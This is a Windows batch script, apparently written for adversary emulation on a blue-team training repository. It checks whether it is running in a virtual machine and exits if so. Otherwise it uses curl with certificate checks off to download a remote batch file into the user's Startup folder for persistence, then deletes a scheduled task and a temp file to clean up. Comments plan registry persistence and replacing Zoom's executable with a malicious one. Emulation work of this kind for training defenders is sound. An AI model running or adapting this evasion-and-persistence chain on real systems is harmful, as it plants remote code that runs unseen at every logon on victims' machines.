@echo off
setlocal EnableDelayedExpansion

echo Advanced Virtual Machine Detection...

:: Check for common VM manufacturer and model artifacts
wmic computersystem get manufacturer, model | findstr /i "VMware VirtualBox Microsoft QEMU Parallels Xen KVM" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] VM-specific manufacturer or model detected.
    goto :end
)

:: Check BIOS for VM-specific strings
wmic bios get serialnumber, version | findstr /i "VMware VirtualBox VBOX Microsoft QEMU Parallels Xen" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] VM-specific BIOS serial or version detected.
    goto :end
)

:: Check for VM disk identifiers
wmic diskdrive get model, interfaceType | findstr /i "VMware VirtualBox VBOX QEMU Parallels" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] Virtual machine disk or interface detected.
    goto :end
)

:: If no VM indicators are found
echo [NOT DETECTED] This system does not exhibit common virtual machine characteristics.

:: TODO
:: Persistence as user
::    Download script to startup
curl.exe -kL https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat -o "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\startupPersistance.bat"
::        powershell.exe -c Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\startupPersistance.bat"

::    Download script to Temp and execute with Registry Key

::    ZoomUpdate EXE change
::        Check if Zoom is in user profile
::        change name of zoom exe
::        Download malicious Zoom exe to folder

:: Delete Scheduled Task
schtasks /DELETE /TN updater /F

:: Delete C:\Windows\Temp\test.bat
del C:\Windows\Temp\test.bat

:end
pause
endlocal
